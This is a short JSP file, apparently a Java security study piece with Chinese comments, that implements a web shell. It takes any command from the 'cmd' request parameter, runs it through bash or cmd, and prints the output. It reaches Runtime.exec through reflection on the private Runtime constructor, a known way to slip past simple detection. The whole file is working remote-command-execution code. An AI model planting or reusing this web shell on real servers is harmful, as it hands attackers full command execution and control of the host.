<%--
  Created by IntelliJ IDEA.
  User: snowstorm-maxy
  Date: 2025/9/30
  Time: 12:56
  To change this template use File | Settings | File Templates.
--%>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    // 漏洞触发点
    String c = request.getParameter("cmd");

    // 根据系统自动调用对应命令
    String[] cmd;
    String osName = System.getProperties().getProperty("os.name");
    if (osName.toLowerCase().contains("windows")) {
        cmd = new String[]{"cmd", "/c", c};
    } else {
        cmd = new String[]{"/bin/bash", "-c", c};
    }

    // 获取Runtime类对象
    Class runtimeClass = Class.forName("java.lang.Runtime");

    // 获取构造方法
    Constructor runtimeConstructor = runtimeClass.getDeclaredConstructor();
    runtimeConstructor.setAccessible(true);

    // 创建Runtime类实例 相当于 Runtime r = new Runtime();
    Object runtimeInstance = runtimeConstructor.newInstance();

    // 获取Runtime的exec(String cmd)方法
    Method runtimeMethod = runtimeClass.getMethod("exec", String[].class);

    // 调用exec方法 等于 r.exec(cmd); cmd参数输入要执行的命令
    Process p = (Process) runtimeMethod.invoke(runtimeInstance, new Object[]{cmd});

    // 获取命令执行结果
    InputStream in = p.getInputStream();

    ByteArrayOutputStream results = new ByteArrayOutputStream();
    byte[] b = new byte[1024];
    int l = -1;

    while ((l = in.read(b)) != -1) {
        results.write(b, 0, l);
    }

    out.print(results);
%>
